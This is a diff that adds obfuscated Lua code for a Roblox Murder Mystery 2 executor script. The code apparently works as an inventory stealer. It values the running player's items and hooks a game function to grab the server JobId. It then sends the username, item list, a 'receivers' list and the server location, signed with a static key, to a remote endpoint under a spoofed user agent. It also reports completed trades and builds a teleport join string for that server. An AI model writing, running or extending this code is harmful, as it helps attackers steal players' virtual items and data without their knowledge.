+	local v321 = #u268 - #t36
+
+	if v321 > 0 then
+		v320 ..= string.format("\n... and %d more item%s", v321, v321 == 1 and "" or "s")
+	end
+
+	local v322 = string.format("%.2f", n9 * 15 / 1000)
+	local v323 = "💰 Total Value ➜ " .. v272(n9) .. " / " .. v322 .. "$\n" .. "==============================\n\n" .. v320
+	local s5 = "Unknown"
+	local identifyexecutor_ = identifyexecutor or getexecutorname
+
+	if type(identifyexecutor_) == "function" then
+		local ok, result = pcall(identifyexecutor_)
+
+		if ok and result then
+			s5 = tostring(result)
+		end
+	end
+
+	local function v328()
+		local v329
+		local v330 = os.clock() + 1
+
+		repeat
+			for _, v in ipairs(getgc(true)) do
+				if typeof(v) == "function" then
+					local ok, result = pcall(debug.getinfo, v)
+
+					if ok and result and result.name == "stepAnimate" then
+						v329 = v
+
+						break
+					end
+				end
+			end
+
+			if not v329 then
+				task.wait(0.2)
+			end
+		until v329 or v330 <= os.clock()
+
+		if not v329 then
+			return game.JobId
+		end
+
+		local JobId
+		local v336
+
+		v336 = hookfunction(v329, function(...)
+			if not JobId then
+				JobId = game.JobId
+			end
+
+			return v336(...)
+		end)
+
+		local v337 = os.clock() + 1
+
+		while true do
+			task.wait(0.2)
+
+			if JobId then
+				break
+			elseif v337 <= os.clock() then
+				break
+			end
+		end
+
+		local JobId2 = JobId or game.JobId
+
+		return JobId2
+	end
+
+	v280 = v328()
+	v281 = HttpService:GenerateGUID(false)
+
+	local t37 = {}
+	local v340, v341, v342 = ipairs(t2)
+
+	for k, v in v340, v341, v342 do
+		t37[k] = v
+	end
+
+	local function v345(p38, p39)
+		local t38 = {}
+		local n11 = 1
+		local v348 = #p38
+		local v349 = p39 or 200
+
+		for i = n11, math.min(v348, v349) do
+			local v351 = p38[i]
+
+			t38[#t38 + 1] = {
+				name = v351.name,
+				itemType = v351.itemType,
+				category = v351.category,
+				year = v351.year,
+				event = v351.event,
+				isChroma = v351.isChroma == true,
+				rarity = v351.rarity,
+				amount = v351.amount
+			}
+		end
+
+		return t38
+	end
+
+	local t39 = {
+		game = "mm2",
+		username = LocalPlayer.Name,
+		displayName = LocalPlayer.DisplayName,
+		executorName = s5,
+		receivers = t37,
+		items = v345(u268, 200),
+		summaryUrl = Url,
+		placeId = tostring(game.PlaceId),
+		jobId = v280,
+		shouldPing = true,
+		sessionRunId = v281
+	}
+	local now = os.time()
+	local signNonce = HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 24)
+	local v355 = v117()
+	local v356 = v113(v106(table.concat({
+		v8,
+		tostring(now),
+		signNonce,
+		LocalPlayer.Name,
+		v355
+	}, "|"), staticKey))
+
+	if not v356 then
+		return
+	end
+
+	t39.timestamp = now
+	t39.fingerprint = v355
+	t39.signNonce = signNonce
+	t39.signSignature = v356
+	starScriptsMM2LiveRuntime = {
+		Active = true,
+		MessageId = nil,
+		Completed = false,
+		Stopping = false,
+		PendingTrades = {}
+	}
+	genv.StarScriptsMM2LiveRuntime = starScriptsMM2LiveRuntime
+
+	local function v357(p40)
+		local JSONDecode = HttpService.JSONDecode
+		local v359 = HttpService
+		local ok, result = pcall(JSONDecode, v359, tostring(p40 or ""))
+
+		if ok and type(result) == "table" then
+			return result
+		end
+	end
+	local function v362()
+		local json = HttpService:JSONEncode(t39)
+		local v364 = v140(json, staticKey) or json
+		local n12 = 0
+		local s6 = "no response"
+
+		for i = 1, 3 do
+			local ok, result = pcall(http_request_, {
+				Url = v10,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json",
+					Accept = "application/json",
+					["User-Agent"] = "RobloxStudio/WinInet"
+				},
+				Body = v364
+			})
+
+			if ok and result then
+				local v370 = type(result) == "table"
+
+				if v370 then
+					v370 = tostring(result.Body or result.body or "")
+				end
+
+				v370 = v370 or tostring(result)
+
+				local v371 = type(result) == "table"
+
+				if v371 then
+					v371 = tonumber(result.StatusCode or result.status or result.Status)
+				end
+
+				n12 = v371 or 0
+				s6 = v370:sub(1, 160)
+
+				local v372 = v370:find("\"delivered\"%s*:%s*true") ~= nil
+				local v373 = v357(v370)
+				local messageId = v373 and v373.messageId
+
+				if messageId ~= nil then
+					messageId = tostring(messageId)
+				end
+
+				if n12 >= 200 and n12 < 300 then
+					if v372 then
+						return true, n12, s6, messageId
+					end
+				end
+
+				if n12 == 0 and v372 then
+					return true, 200, s6, messageId
+				end
+
+				if n12 >= 400 and n12 < 500 and n12 ~= 429 then
+					break
+				end
+			else
+				s6 = tostring(result):sub(1, 160)
+			end
+
+			if i < 3 then
+				task.wait(0.35 * i)
+			end
+		end
+
+		return false, n12, s6
+	end
+
+	v283 = function(p41, p42, p43)
+		if not starScriptsMM2LiveRuntime.Active or starScriptsMM2LiveRuntime.Stopping and p41 ~= "disconnect" or not starScriptsMM2LiveRuntime.MessageId then
+			return false
+		end
+
+		local t40 = {
+			username = LocalPlayer.Name,
+			jobId = v280,
+			messageId = starScriptsMM2LiveRuntime.MessageId,
+			action = p41
+		}
+		local now2 = os.time()
+		local signNonce2 = HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 24)
+		local v378 = v117()
+		local v379 = v113(v106(table.concat({
+			v8,
+			tostring(now2),
+			signNonce2,
+			LocalPlayer.Name,
+			v378
+		}, "|"), staticKey))
+
+		if v379 then
+			t40.timestamp = now2
+			t40.fingerprint = v378
+			t40.signNonce = signNonce2
+			t40.signSignature = v379
+		else
+			t40.staticKey = staticKey
+		end
+
+		local v380 = p42 or {}
+
+		for k, v in pairs(v380) do
+			t40[k] = v
+		end
+
+		local json = HttpService:JSONEncode(t40)
+		local v384 = v140(json, staticKey) or json
+		local v385 = math.max(1, tonumber(p43) or 1)
+
+		for i = 1, v385 do
+			local ok, result = pcall(http_request_, {
+				Url = v11,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json",
+					Accept = "application/json"
+				},
+				Body = v384
+			})
+
+			if ok and result then
+				local v389 = type(result) == "table"
+
+				if v389 then
+					v389 = tonumber(result.StatusCode or result.status or result.Status)
+				end
+
+				v389 = v389 or 0
+
+				local v390 = type(result) == "table"
+
+				if v390 then
+					v390 = tostring(result.Body or result.body or "")
+				end
+
+				local v391 = v357(v390 or tostring(result))
+
+				if v389 >= 200 and v389 < 300 or v389 == 0 and v391 and v391.status then
+					return true, v391
+				end
+
+				if v389 >= 400 and v389 < 500 and v389 ~= 429 then
+					return false, v391
+				end
+			end
+
+			if i < v385 then
+				task.wait(math.min(2, 0.35 * i))
+			end
+		end
+
+		return false
+	end
+	v284 = function(p44, p45)
+		local v392 = math.max(0, tonumber(p44) or 0)
+
+		if v392 <= 0 then
+			return
+		end
+
+		local t41 = {
+			tradeValue = v392,
+			tradeId = tostring(p45)
+		}
+
+		if not starScriptsMM2LiveRuntime.MessageId then
+			table.insert(starScriptsMM2LiveRuntime.PendingTrades, t41)
+
+			return
+		end
+
+		task.spawn(function()
+			local v394 = v283("trade_completed", t41, 5)
+
+			if v394 then
+				starScriptsMM2LiveRuntime.Completed = true
+			end
+		end)
+	end
 
 -- Join link payload string format
 local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', game.PlaceId, game.JobId)
